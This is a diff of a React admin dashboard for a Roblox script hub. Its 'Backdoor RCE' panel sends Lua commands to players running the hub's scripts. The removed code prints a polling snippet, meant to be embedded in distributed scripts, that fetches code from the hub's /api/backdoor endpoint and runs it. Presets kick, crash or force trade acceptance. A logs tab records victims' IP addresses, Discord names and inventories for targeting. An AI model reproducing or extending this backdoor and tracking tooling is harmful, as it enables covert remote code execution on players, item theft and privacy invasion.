+            {selectedScript && (
+              <div className="bg-[#0a0d16] border border-gray-800 p-4 sm:p-5 rounded-3xl space-y-4 shadow-xl">
+                <div className="bg-black/90 p-3.5 rounded-2xl border border-[#6E96FF]/40 space-y-2">
+                  <div className="flex items-center justify-between text-[11px] text-[#6E96FF] font-bold">
+                    <span>Execution Loadstring URL:</span>
+                  </div>
+                  <div className="bg-[#0c0f17] p-2.5 rounded-xl font-mono text-[11px] text-gray-300 break-all border border-gray-800 select-all">
+                    {getScriptLoadstring(slug)}
+                  </div>
+                  <button onClick={() => handleCopyLoader(slug)} className="w-full bg-[#6E96FF] text-black font-black py-2 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer hover:brightness-110 active:scale-95 transition-all">
+                    {copiedLoader ? 'Copied!' : 'Copy Loadstring'}
+                  </button>
+                </div>
+
+                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
+                  <div>
+                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Title</label>
+                    <input value={title} onChange={(e) => setTitle(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-extrabold text-white" />
+                  </div>
+                  <div>
+                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Slug (/api/raw/slug)</label>
+                    <input value={slug} onChange={(e) => setSlug(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-[#6E96FF] font-mono" />
+                  </div>
+                  <div>
+                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Status</label>
+                    <select value={status} onChange={(e) => setStatus(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white">
+                      <option value="working">Working</option>
+                      <option value="updating">Updating</option>
+                      <option value="patched">Patched</option>
+                    </select>
+                  </div>
+                </div>
+
+                <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
+                  <div className="flex gap-2 flex-1 flex-wrap">
+                    <button onClick={handleSaveScript} disabled={isSaving} className="bg-[#6E96FF] text-black font-black px-4 py-2.5 rounded-xl text-xs flex items-center gap-1.5 cursor-pointer">
+                      {isSaving ? 'Saving...' : 'Save Code'}
+                    </button>
+                    <button onClick={handleDuplicateScript} className="bg-purple-600/20 text-purple-300 border border-purple-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+                      Duplicate
+                    </button>
+                    <label className="bg-blue-600/20 text-blue-300 border border-blue-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+                      Upload .lua
+                      <input type="file" accept=".lua,.txt" onChange={handleUploadToEditor} className="hidden" />
+                    </label>
+                    <button onClick={() => setCode('')} className="bg-yellow-600/20 text-yellow-400 border border-yellow-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+                      Clear
+                    </button>
+                  </div>
+                  <button onClick={() => handleDeleteScript(selectedScript.id)} className="bg-red-600/20 text-red-400 border border-red-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
+                    Delete
+                  </button>
+                </div>
+
+                <div className="h-[420px] border border-gray-800 rounded-2xl overflow-hidden shadow-2xl bg-[#1e1e1e]">
+                  <Editor height="100%" defaultLanguage="lua" theme="vs-dark" value={code} onChange={(v) => setCode(v || '')} options={{ minimap: { enabled: false }, fontSize: 13 }} />
+                </div>
+              </div>
             )}
           </div>
         </div>
       )}
 
-      {/* Editor panel */}
-      {(!isMobile || view === 'editor') && selected && (
-        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 16, minWidth: 0 }}>
-          {isMobile && (
-            <button onClick={() => setView('list')} style={{ ...css.btn('ghost'), alignSelf: 'flex-start' }}>
-              ← Back to list
-            </button>
-          )}
-
-          {/* Loadstring */}
-          <div style={{ ...css.card(true), borderRadius: 14 }}>
-            <div style={{ padding: '14px 18px' }}>
-              <div style={{ fontSize: 10, fontWeight: 800, color: T.textMuted, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 10 }}>Execution Loadstring</div>
-              <div style={{ background: 'rgba(0,0,0,0.5)', borderRadius: 8, padding: '10px 14px', fontFamily: 'monospace', fontSize: 11, color: '#94a3b8', wordBreak: 'break-all', marginBottom: 10, border: `1px solid ${T.border}` }}>
-                {loadstring}
+      {/* TAB 3: BACKDOOR RCE */}
+      {activeTab === 'backdoor' && (
+        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
+          <div className="lg:col-span-7 bg-[#0a0d16] border border-yellow-500/30 p-5 rounded-3xl space-y-4 shadow-2xl">
+            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
+              <div className="flex items-center gap-2">
+                <h2 className="text-sm font-black text-yellow-400 uppercase tracking-wider">BACKDOOR RCE</h2>
               </div>
-              <CopyBtn text={loadstring} label="Copy Loadstring" />
+              <span className="text-[10px] bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 px-2 py-0.5 rounded-full font-extrabold">
+                LOADSTRING
+              </span>
             </div>
-          </div>
 
-          {/* Meta fields */}
-          <div style={{ display: 'grid', gridTemplateColumns: isMobile ? '1fr 1fr' : '1fr 1fr auto', gap: 12 }}>
-            <div>
-              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Title</div>
-              <input value={title} onChange={e => setTitle(e.target.value)} style={css.input}
-                onFocus={e => e.target.style.borderColor = T.accent} onBlur={e => e.target.style.borderColor = T.border} />
-            </div>
-            <div>
-              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Slug</div>
-              <input value={slug} onChange={e => setSlug(e.target.value)} style={{ ...css.input, fontFamily: 'monospace', color: T.accent }}
-                onFocus={e => e.target.style.borderColor = T.accent} onBlur={e => e.target.style.borderColor = T.border} />
-            </div>
-            <div>
-              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Status</div>
-              <select value={status} onChange={e => setStatus(e.target.value)}
-                style={{ ...css.input, color: statusColor(status), fontWeight: 700, cursor: 'pointer' }}
-                onFocus={e => e.target.style.borderColor = T.accent} onBlur={e => e.target.style.borderColor = T.border}>
-                <option value="working">Working</option>
-                <option value="updating">Updating</option>
-                <option value="patched">Patched</option>
-              </select>
-            </div>
-          </div>
-
-          {/* Toolbar */}
-          <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center', justifyContent: 'space-between' }}>
-            <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
-              <button onClick={save} disabled={saving} style={{ ...css.btn('primary'), opacity: saving ? 0.6 : 1 }}>
-                {saving ? 'Saving...' : '↑ Save'}
-              </button>
-              <button style={css.btn('purple')}>Duplicate</button>
-              <label style={{ ...css.btn('ghost'), cursor: 'pointer' }}>
-                Upload .lua
-                <input type="file" accept=".lua,.txt" style={{ display: 'none' }} onChange={e => { const f = e.target.files[0]; if (!f) return; const r = new FileReader(); r.onload = ev => setCode(ev.target.result); r.readAsText(f); }} />
-              </label>
-              <button onClick={() => setCode('')} style={css.btn('ghost')}>Clear</button>
-            </div>
-            <button onClick={() => del(selected.id)} style={css.btn('danger')}>
-              <Icon.Trash /> Delete
-            </button>
-          </div>
-
-          {/* Code editor */}
-          <div style={{ height: 380, border: `1px solid ${T.border}`, borderRadius: 12, overflow: 'hidden', background: '#0d0f14' }}>
-            <div style={{ height: 32, background: '#0a0c12', borderBottom: `1px solid ${T.border}`, display: 'flex', alignItems: 'center', padding: '0 14px', gap: 6 }}>
-              {['#ff5f57','#febc2e','#28c840'].map(c => (
-                <div key={c} style={{ width: 10, height: 10, borderRadius: '50%', background: c }} />
-              ))}
-              <span style={{ fontSize: 11, color: T.textMuted, marginLeft: 8, fontFamily: 'monospace' }}>{slug}.lua</span>
-            </div>
-            <Editor height="calc(380px - 32px)" value={code} onChange={v => setCode(v || '')} />
-          </div>
-        </div>
-      )}
-    </div>
-  );
-};
-
-// ─── BACKDOOR TAB ─────────────────────────────────────────────────────────────
-const BackdoorTab = ({ defaultUser }) => {
-  const [targetType, setTargetType] = useState(defaultUser ? 'USER' : 'ALL');
-  const [targetVal, setTargetVal] = useState(defaultUser || 'ALL');
-  const [payload, setPayload] = useState('print("[Lurix Backdoor]: Executed")');
-  const [sending, setSending] = useState(false);
-  const [history, setHistory] = useState([]);
-
-  useEffect(() => { if (defaultUser) { setTargetType('USER'); setTargetVal(defaultUser); } }, [defaultUser]);
-
-  const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';
-
-  const snippet = `-- [Lurix Hub] Backdoor Engine
-task.spawn(function()
-    local HttpService = game:GetService("HttpService")
-    local Players = game:GetService("Players")
-    local lp = Players.LocalPlayer
-    local req = (syn and syn.request) or request or http_request
-
-    while task.wait(4) do
-        pcall(function()
-            if not lp then return end
-            local url = "${domain}/api/backdoor?user=" .. HttpService:UrlEncode(lp.Name)
-            local res = req({ Url = url, Method = "GET" })
-            if res and res.Body and #res.Body > 0 then
-                local fn = loadstring(res.Body)
-                if fn then task.spawn(fn) end
-            end
-        end)
-    end
-end)`;
-
-  const PRESETS = [
-    { label: 'Kick', color: T.red, payload: `game:GetService("Players").LocalPlayer:Kick("Admin action")` },
-    { label: 'Crash', color: T.purple, payload: `while true do end` },
-    { label: 'Notify', color: T.accent, payload: `game:GetService("StarterGui"):SetCore("SendNotification",{Title="LURIX",Text="Admin is watching!",Duration=10})` },
-    { label: 'Jumpscare', color: T.yellow, payload: `local s=Instance.new("Sound",game:GetService("SoundService"));s.SoundId="rbxassetid://9114223177";s.Volume=10;s:Play()` },
-    { label: 'Accept Trade', color: T.green, payload: `game:GetService("ReplicatedStorage").TradeEvents.TradeComm:FireServer("AcceptTrade")` },
-  ];
-
-  const send = async () => {
-    if (!payload.trim()) return;
-    setSending(true);
-    await new Promise(r => setTimeout(r, 800));
-    setHistory(h => [{ id: Date.now(), targetType, targetValue: targetVal, payload_lua: payload, created_at: new Date().toISOString() }, ...h.slice(0, 19)]);
-    setSending(false);
-    alert('Command dispatched.');
-  };
-
-  return (
-    <div style={{ display: 'flex', gap: 20, flexWrap: 'wrap' }}>
-      {/* Left panel */}
-      <div style={{ flex: '1 1 340px', display: 'flex', flexDirection: 'column', gap: 16 }}>
-        <div style={{ ...css.card(false), borderColor: `${T.yellow}33` }}>
-          <div style={{ ...css.cardHeader }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
-              <div style={{ color: T.yellow }}><Icon.Zap /></div>
-              <span style={{ fontWeight: 800, fontSize: 13, color: T.yellow }}>Remote Code Execution</span>
-            </div>
-            <div style={css.badge(T.yellow)}>LIVE</div>
-          </div>
-          <div style={{ padding: '20px' }}>
-            {/* Target */}
-            <div style={{ display: 'grid', gridTemplateColumns: targetType !== 'ALL' ? '120px 1fr' : '1fr', gap: 12, marginBottom: 16 }}>
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
               <div>
-                <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>Target Type</div>
-                <select value={targetType} onChange={e => setTargetType(e.target.value)} style={{ ...css.input, fontWeight: 700, cursor: 'pointer', color: T.yellow }}
-                  onFocus={e => e.target.style.borderColor = T.yellow} onBlur={e => e.target.style.borderColor = T.border}>
+                <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">TARGET TYPE:</label>
+                <select
+                  value={backdoorTargetType}
+                  onChange={(e) => setBackdoorTargetType(e.target.value)}
+                  className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white focus:border-yellow-500 outline-none cursor-pointer"
+                >
                   <option value="ALL">ALL</option>
                   <option value="USER">User</option>
                   <option value="IP">IP</option>
                 </select>
               </div>
-              {targetType !== 'ALL' && (
+
+              {backdoorTargetType !== 'ALL' && (
                 <div>
-                  <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>Value</div>
-                  <input value={targetVal} onChange={e => setTargetVal(e.target.value)}
-                    placeholder={targetType === 'USER' ? 'username' : 'ip address'}
-                    style={{ ...css.input, fontFamily: 'monospace', color: T.yellow }}
-                    onFocus={e => e.target.style.borderColor = T.yellow} onBlur={e => e.target.style.borderColor = T.border} />
+                  <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">VALUE ({backdoorTargetType}):</label>
+                  <input
+                    type="text"
+                    placeholder={backdoorTargetType === 'USER' ? 'username' : 'ip address'}
+                    value={backdoorTargetValue}
+                    onChange={(e) => setBackdoorTargetValue(e.target.value)}
+                    className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-yellow-400 font-mono focus:border-yellow-500 outline-none"
+                  />
                 </div>
               )}
             </div>
 
-            {/* Presets */}
-            <div style={{ marginBottom: 16 }}>
-              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 8, textTransform: 'uppercase' }}>Quick Presets</div>
-              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
-                {PRESETS.map(p => (
-                  <button key={p.label} onClick={() => setPayload(p.payload)}
-                    style={{ ...css.btn('ghost'), padding: '6px 12px', fontSize: 11, color: p.color, borderColor: `${p.color}33`, background: `${p.color}0d` }}>
-                    {p.label}
-                  </button>
-                ))}
+            <div>
+              <label className="text-[10px] font-extrabold text-gray-400 mb-1.5 block">PRESETS:</label>
+              <div className="flex flex-wrap gap-2">
+                <button onClick={() => setPresetPayload('kick')} className="bg-red-500/15 border border-red-500/30 text-red-400 hover:bg-red-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Kick Player
+                </button>
+                <button onClick={() => setPresetPayload('crash')} className="bg-purple-500/15 border border-purple-500/30 text-purple-300 hover:bg-purple-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Crash Client
+                </button>
+                <button onClick={() => setPresetPayload('notification')} className="bg-blue-500/15 border border-blue-500/30 text-blue-300 hover:bg-blue-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Notification
+                </button>
+                <button onClick={() => setPresetPayload('trade')} className="bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Auto Trade
+                </button>
+                <button onClick={() => setPresetPayload('Agree')} className="bg-green-500/15 border border-green-500/30 text-green-400 hover:bg-green-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Accept Trade
+                </button>
+                <button onClick={() => setPresetPayload('jumpscare')} className="bg-yellow-500/15 border border-yellow-500/30 text-yellow-300 hover:bg-yellow-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
+                  Jumpscare
+                </button>
               </div>
             </div>
 
-            {/* Payload */}
-            <div style={{ marginBottom: 16 }}>
-              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>Lua Payload</div>
-              <div style={{ border: `1px solid ${T.border}`, borderRadius: 10, overflow: 'hidden', background: '#0d0f14' }}>
-                <div style={{ height: 28, background: '#0a0c12', borderBottom: `1px solid ${T.border}`, display: 'flex', alignItems: 'center', padding: '0 12px', gap: 5 }}>
-                  {['#ff5f57','#febc2e','#28c840'].map(c => <div key={c} style={{ width: 8, height: 8, borderRadius: '50%', background: c }} />)}
-                </div>
-                <Editor height="200px" value={payload} onChange={v => setPayload(v || '')} />
+            <div>
+              <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">LUA PAYLOAD:</label>
+              <div className="h-[240px] border border-gray-800 rounded-2xl overflow-hidden shadow-inner bg-[#1e1e1e]">
+                <Editor
+                  height="100%"
+                  defaultLanguage="lua"
+                  theme="vs-dark"
+                  value={backdoorLuaPayload}
+                  onChange={(v) => setBackdoorLuaPayload(v || '')}
+                  options={{ minimap: { enabled: false }, fontSize: 12 }}
+                />
               </div>
             </div>
 
-            <button onClick={send} disabled={sending} style={{
-              ...css.btn('yellow'),
-              width: '100%',
-              justifyContent: 'center',
-              padding: '13px',
-              fontSize: 13,
-              fontWeight: 900,
-              borderRadius: 12,
-              opacity: sending ? 0.6 : 1,
-              boxShadow: `0 0 30px ${T.yellowGlow}`,
-            }}>
-              {sending ? 'Sending...' : '⚡ Execute Command'}
+            <button
+              onClick={handleSendBackdoor}
+              disabled={isSendingBackdoor}
+              className="w-full bg-gradient-to-r from-yellow-500 to-amber-600 text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_25px_rgba(245,158,11,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 active:scale-95 disabled:opacity-50"
+            >
+              {isSendingBackdoor ? 'Sending...' : 'Execute'}
             </button>
           </div>
-        </div>
-      </div>
 
-      {/* Right panel */}
-      <div style={{ flex: '1 1 280px', display: 'flex', flexDirection: 'column', gap: 16 }}>
-        {/* Snippet */}
-        <div style={css.card(false)}>
-          <div style={css.cardHeader}>
-            <span style={{ fontSize: 12, fontWeight: 700, color: T.text }}>Integration Snippet</span>
-            <CopyBtn text={snippet} label="Copy" small />
-          </div>
-          <div style={{ padding: '14px 18px' }}>
-            <p style={{ fontSize: 11, color: T.textMuted, marginBottom: 10 }}>Embed in your scripts to enable remote command polling:</p>
-            <pre style={{ background: 'rgba(0,0,0,0.5)', borderRadius: 8, padding: '10px 12px', fontSize: 10, fontFamily: 'monospace', color: `${T.yellow}dd`, border: `1px solid ${T.border}`, maxHeight: 160, overflowY: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
-              {snippet}
-            </pre>
-          </div>
-        </div>
+          <div className="lg:col-span-5 flex flex-col gap-4">
+            <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3">
+              <div className="flex items-center justify-between text-xs font-black text-[#6E96FF]">
+                <span>Backdoor Integration Snippet</span>
+                <button onClick={handleCopyBackdoorSnippet} className="bg-[#6E96FF] text-black px-2.5 py-1 rounded-lg text-[10px] font-extrabold cursor-pointer">
+                  {copiedBackdoorSnippet ? 'Copied' : 'Copy Code'}
+                </button>
+              </div>
+              <p className="text-[11px] text-gray-400">Include this snippet in raw scripts to listen for remote payload commands:</p>
+              <pre className="bg-black/80 p-3 rounded-xl font-mono text-[10px] text-yellow-300/90 border border-gray-800 max-h-[160px] overflow-y-auto">
+                {getBackdoorLuaSnippet()}
+              </pre>
+            </div>
 
-        {/* History */}
-        <div style={{ ...css.card(false), flex: 1 }}>
-          <div style={css.cardHeader}>
-            <span style={{ fontSize: 12, fontWeight: 700, color: T.text }}>Command History</span>
-            <div style={css.badge(T.textMuted)}>{history.length}</div>
-          </div>
-          <div style={{ padding: '14px', display: 'flex', flexDirection: 'column', gap: 8, maxHeight: 300, overflowY: 'auto' }}>
-            {history.length === 0
-              ? <div style={{ textAlign: 'center', padding: '24px 0', color: T.textMuted, fontSize: 12 }}>No history yet</div>
-              : history.map(h => (
-                <div key={h.id} style={{ background: 'rgba(0,0,0,0.3)', border: `1px solid ${T.border}`, borderRadius: 10, padding: '10px 12px' }}>
-                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
-                    <span style={{ fontSize: 10, fontWeight: 700, color: T.yellow }}>{h.targetType}: {h.targetValue}</span>
-                    <span style={{ fontSize: 10, color: T.textMuted }}>{new Date(h.created_at).toLocaleTimeString()}</span>
-                  </div>
-                  <div style={{ fontSize: 11, color: '#94a3b8', fontFamily: 'monospace', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
-                    {h.payload_lua}
-                  </div>
-                </div>
-              ))
-            }
-          </div>
-        </div>
-      </div>
-    </div>
-  );
-};
-
-// ─── USER LOGS TAB ────────────────────────────────────────────────────────────
-const UserLogsTab = ({ onTarget }) => {
-  const [logs, setLogs] = useState(MOCK_LOGS);
-  const [search, setSearch] = useState('');
-  const [loading, setLoading] = useState(false);
-  const [storageLog, setStorageLog] = useState(null);
-  const [storageTab, setStorageTab] = useState('stands');
-  const [copiedId, setCopiedId] = useState(null);
-
-  const filtered = useMemo(() => {
-    const q = search.toLowerCase();
-    if (!q) return logs;
-    return logs.filter(l => [l.roblox_username, l.ip_address, l.discord_user, l.roblox_id].some(v => v?.toLowerCase().includes(q)));
-  }, [logs, search]);
-
-  const refresh = async () => {
-    setLoading(true);
-    await new Promise(r => setTimeout(r, 600));
-    setLoading(false);
-  };
-
-  const copyJoin = async (log) => {
-    if (!log.place_id || !log.job_id) return;
-    const s = `game:GetService("TeleportService"):TeleportToPlaceInstance(${log.place_id}, "${log.job_id}", game.Players.LocalPlayer)`;
-    await navigator.clipboard.writeText(s);
-    setCopiedId(log.id);
-    setTimeout(() => setCopiedId(null), 2000);
-  };
-
-  const parsedStorage = useMemo(() => {
-    if (!storageLog?.stand_storage) return { slots: [], spec_storage: 'Empty' };
-    try { return typeof storageLog.stand_storage === 'string' ? JSON.parse(storageLog.stand_storage) : storageLog.stand_storage; }
-    catch { return { slots: [], spec_storage: 'Empty' }; }
-  }, [storageLog]);
-
-  const parsedInventory = useMemo(() => {
-    if (!storageLog?.inventory_data) return [];
-    try { return typeof storageLog.inventory_data === 'string' ? JSON.parse(storageLog.inventory_data) : storageLog.inventory_data; }
-    catch { return []; }
-  }, [storageLog]);
-
-  return (
-    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
-      {/* Header */}
-      <div style={{ display: 'flex', gap: 12, flexWrap: 'wrap', alignItems: 'center', justifyContent: 'space-between' }}>
-        <div style={{ flex: '1 1 200px' }}>
-          <input
-            value={search}
-            onChange={e => setSearch(e.target.value)}
-            placeholder="Search by username, IP, Discord, ID..."
-            style={{ ...css.input }}
-            onFocus={e => e.target.style.borderColor = T.accent}
-            onBlur={e => e.target.style.borderColor = T.border}
-          />
-        </div>
-        <div style={{ display: 'flex', gap: 8 }}>
-          <button onClick={refresh} style={css.btn('ghost')}>
-            <Icon.RefreshCw /> {loading ? 'Loading...' : 'Refresh'}
-          </button>
-          <button onClick={() => { if (confirm('Clear all logs?')) setLogs([]); }} style={css.btn('danger')}>
-            <Icon.Trash /> Clear
-          </button>
-        </div>
-      </div>
-
-      {/* Table */}
-      <div style={{ ...css.card(false), overflow: 'hidden' }}>
-        <div style={{ overflowX: 'auto' }}>
-          <table style={css.table}>
-            <thead>
-              <tr>
-                {['User', 'Server', 'IP', 'Discord / Exec', 'Timestamp', 'Actions'].map(h => (
-                  <th key={h} style={css.th}>{h}</th>
-                ))}
-              </tr>
-            </thead>
-            <tbody>
-              {filtered.length === 0
-                ? (
-                  <tr>
-                    <td colSpan={6} style={{ ...css.td, textAlign: 'center', padding: '48px', color: T.textMuted }}>
-                      {search ? `No results for "${search}"` : 'No logs.'}
-                    </td>
-                  </tr>
-                )
-                : filtered.map(log => (
-                  <tr key={log.id} style={{ transition: 'background 0.1s' }}
-                    onMouseEnter={e => e.currentTarget.style.background = 'rgba(110,150,255,0.03)'}
-                    onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
-                    <td style={css.td}>
-                      <div style={{ fontWeight: 700, fontSize: 12, color: T.text }}>{log.roblox_username}</div>
-                      <div style={{ fontSize: 10, fontFamily: 'monospace', color: T.textMuted, marginTop: 2 }}>ID: {log.roblox_id}</div>
-                    </td>
-                    <td style={css.td}>
-                      <div style={css.badge(log.is_vip ? T.purple : T.green)}>{log.is_vip ? 'VIP' : 'Public'}</div>
-                    </td>
-                    <td style={{ ...css.td, fontFamily: 'monospace', fontSize: 11, color: T.accent }}>{log.ip_address}</td>
-                    <td style={css.td}>
-                      <div style={{ fontSize: 12, fontWeight: 600, color: '#818cf8' }}>{log.discord_user || '—'}</div>
-                      <div style={{ fontSize: 10, fontFamily: 'monospace', color: T.textMuted, marginTop: 2 }}>{log.executor}</div>
-                    </td>
-                    <td style={{ ...css.td, fontSize: 11, color: T.textMuted, whiteSpace: 'nowrap' }}>
-                      {new Date(log.created_at).toLocaleString()}
-                    </td>
-                    <td style={css.td}>
-                      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
-                        <button onClick={() => { setStorageLog(log); setStorageTab('stands'); }}
-                          style={{ ...css.btn('secondary'), padding: '6px 10px', fontSize: 10 }}>
-                          <Icon.Package /> Storage
-                        </button>
-                        {log.place_id && log.job_id
-                          ? <button onClick={() => copyJoin(log)}
-                              style={{ ...css.btn(copiedId === log.id ? 'green' : 'secondary'), padding: '6px 10px', fontSize: 10 }}>
-                              {copiedId === log.id ? <Icon.Check /> : <Icon.Copy />}
-                              {copiedId === log.id ? 'Copied' : 'Join'}
-                            </button>
-                          : <span style={{ fontSize: 10, color: T.textDim, fontStyle: 'italic' }}>No JobId</span>
-                        }
-                        <button onClick={() => onTarget(log.roblox_username)}
-                          style={{ ...css.btn('yellow'), padding: '6px 10px', fontSize: 10 }}>
-                          <Icon.Target /> Target
-                        </button>
+            <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3 flex-1">
+              <h3 className="text-xs font-black text-white uppercase tracking-wider">
+                Command History ({backdoorHistory.length})
+              </h3>
+              <div className="space-y-2 max-h-[260px] overflow-y-auto pr-1">
+                {backdoorHistory.length === 0 ? (
+                  <div className="text-xs text-gray-500 text-center py-6">No history available.</div>
+                ) : (
+                  backdoorHistory.map((h) => (
+                    <div key={h.id} className="bg-black/60 border border-gray-800 p-2.5 rounded-xl font-mono text-[10px] space-y-1">
+                      <div className="flex justify-between text-gray-400">
+                        <span className="text-yellow-400 font-bold">Target: {h.target_type} ({h.target_value})</span>
+                        <span>{new Date(h.created_at).toLocaleTimeString('en-US')}</span>
                       </div>
+                      <div className="text-gray-300 truncate font-sans">{h.payload_lua}</div>
+                    </div>
+                  ))
+                )}
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* TAB 4: USER LOGS */}
+      {activeTab === 'user_logs' && (
+        <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
+          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
+            <div>
+              <h2 className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase tracking-wide">
+                Execution Logs ({filteredLogs.length}/{logs.length})
+              </h2>
+            </div>
+            <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
+              <button onClick={loadLogsData} className="bg-gray-800 text-gray-200 border border-gray-700 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer hover:bg-gray-700 transition-all">
+                {isLoadingLogs ? 'Refreshing...' : 'Refresh'}
+              </button>
+              <button onClick={handleClearLogs} className="bg-red-500/15 text-red-400 border border-red-500/30 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer hover:bg-red-500/25 transition-all">
+                Clear Logs
+              </button>
+            </div>
+          </div>
+
+          <div className="relative">
+            <input
+              type="text"
+              placeholder="Search by username, ID, IP, Discord..."
+              value={logSearchQuery}
+              onChange={(e) => setLogSearchQuery(e.target.value)}
+              className="w-full bg-black/80 border border-gray-800 rounded-xl px-4 py-2.5 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none transition-all shadow-inner"
+            />
+            {logSearchQuery && (
+              <button 
+                onClick={() => setLogSearchQuery('')}
+                className="absolute right-3.5 top-1/2 -translate-y-1/2 text-xs text-gray-400 hover:text-white cursor-pointer bg-gray-800 px-1.5 py-0.5 rounded-md"
+              >
+                Clear
+              </button>
+            )}
+          </div>
+
+          <div className="overflow-x-auto border border-gray-800 rounded-2xl bg-black/40">
+            <table className="w-full text-left text-xs">
+              <thead className="bg-[#0c0f17] text-gray-400 font-extrabold border-b border-gray-800 uppercase text-[10px]">
+                <tr>
+                  <th className="p-3.5">Roblox User</th>
+                  <th className="p-3.5">Server Type</th>
+                  <th className="p-3.5">IP Address</th>
+                  <th className="p-3.5">Discord / Executor</th>
+                  <th className="p-3.5">Timestamp</th>
+                  <th className="p-3.5">Actions</th>
+                </tr>
+              </thead>
+              <tbody className="divide-y divide-gray-800/60 font-mono">
+                {filteredLogs.length === 0 ? (
+                  <tr>
+                    <td colSpan={6} className="text-center py-8 text-gray-500 font-sans text-xs">
+                      {logSearchQuery ? `No logs match "${logSearchQuery}"` : 'No log data.'}
                     </td>
                   </tr>
-                ))
-              }
-            </tbody>
-          </table>
-        </div>
-      </div>
+                ) : (
+                  filteredLogs.map((log) => {
+                    const isCopied = copiedJoinId === log.id;
 
-      {/* Storage Modal */}
-      {storageLog && (
-        <div style={css.overlay} onClick={e => { if (e.target === e.currentTarget) setStorageLog(null); }}>
-          <div style={css.modal} onClick={e => e.stopPropagation()}>
-            {/* Header */}
-            <div style={{ padding: '18px 22px', borderBottom: `1px solid ${T.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between', background: 'rgba(0,0,0,0.3)' }}>
-              <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
-                <div style={{ ...css.logoIcon, width: 36, height: 36 }}>
-                  {storageLog.roblox_username[0].toUpperCase()}
+                    return (
+                      <tr key={log.id} className="hover:bg-white/[0.02] transition-all">
+                        <td className="p-3.5 font-sans font-bold text-white">
+                          <div>{log.roblox_username}</div>
+                          <div className="text-[10px] text-gray-400 font-mono">ID: {log.roblox_id}</div>
+                        </td>
+
+                        <td className="p-3.5">
+                          {log.is_vip ? (
+                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-black bg-purple-500/15 border border-purple-500/30 text-purple-400">
+                              VIP Server
+                            </span>
+                          ) : (
